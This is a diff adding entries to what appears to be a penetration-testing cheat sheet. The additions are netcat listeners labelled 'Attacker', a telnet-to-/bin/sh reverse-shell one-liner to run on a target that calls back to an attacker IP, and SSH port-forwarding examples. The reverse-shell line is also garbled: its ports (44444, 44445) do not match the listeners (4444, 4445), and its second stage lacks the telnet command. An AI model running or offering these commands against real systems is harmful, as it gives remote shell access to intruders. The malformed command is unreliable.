@@ -93,6 +93,18 @@ tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21
 #    Note: tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]
 #
 ######################################################
+nc -lvp 4444    # Attacker. Input (Commands)
+nc -lvp 4445    # Attacker. Ouput (Results)
+telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP!
+#### https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/  
+####
+#########################################################################################
+#    Note: ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]    #
+#                                                                                       #
+#########################################################################################
+ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port
+ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port
 
+###############################################################
 
 
